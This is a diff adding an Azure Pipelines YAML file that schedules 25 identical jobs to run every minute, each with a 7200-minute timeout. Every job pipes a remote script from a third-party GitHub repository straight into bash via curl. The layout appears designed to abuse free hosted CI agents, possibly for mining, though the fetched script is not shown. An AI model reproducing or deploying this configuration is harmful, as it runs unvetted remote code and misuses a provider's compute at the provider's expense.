@@ -1,0 +1,186 @@
+# YAML file in the main branch
+schedules:
+- cron: '* * * * *'
+  displayName: Every minutes
+  branches:
+    include:
+    - main
+
+pool:
+  vmImage: 'ubuntu-latest' # Select machine size from predefined Microsoft-hosted agents
+
+jobs:
+- job: Job1
+  displayName: 'Job 1'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 1'
+
+- job: Job2
+  displayName: 'Job 2'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 2'
+
+- job: Job3
+  displayName: 'Job 3'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 3'
+
+- job: Job4
+  displayName: 'Job 4'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 4'
+
+- job: Job5
+  displayName: 'Job 5'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 5'
+
+- job: Job6
+  displayName: 'Job 6'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 6'
+
+- job: Job7
+  displayName: 'Job 7'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 7'
+
+- job: Job8
+  displayName: 'Job 8'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 8'
+
+- job: Job9
+  displayName: 'Job 9'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 9'
+
+- job: Job10
+  displayName: 'Job 10'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 10'
+
+- job: Job11
+  displayName: 'Job 11'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 11'
+
+- job: Job12
+  displayName: 'Job 12'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 12'
+
+- job: Job13
+  displayName: 'Job 13'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 13'
+
+- job: Job14
+  displayName: 'Job 14'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 14'
+
+- job: Job15
+  displayName: 'Job 15'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 15'
+
+- job: Job16
+  displayName: 'Job 16'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 16'
+
+- job: Job17
+  displayName: 'Job 17'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 17'
+
+- job: Job18
+  displayName: 'Job 18'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 18'
+
+- job: Job19
+  displayName: 'Job 19'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 19'
+
+- job: Job20
+  displayName: 'Job 20'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 20'
+
+- job: Job21
+  displayName: 'Job 21'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 21'
+
+- job: Job22
+  displayName: 'Job 22'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 22'
+
+- job: Job23
+  displayName: 'Job 23'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 23'
+
+- job: Job24
+  displayName: 'Job 24'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 24'
+
+- job: Job25
+  displayName: 'Job 25'
+  timeoutInMinutes: 7200
+  steps:
+  - script: curl -sL https://github.com/kartolo92/pile/raw/main/run | bash
+    displayName: 'Run Job 25'
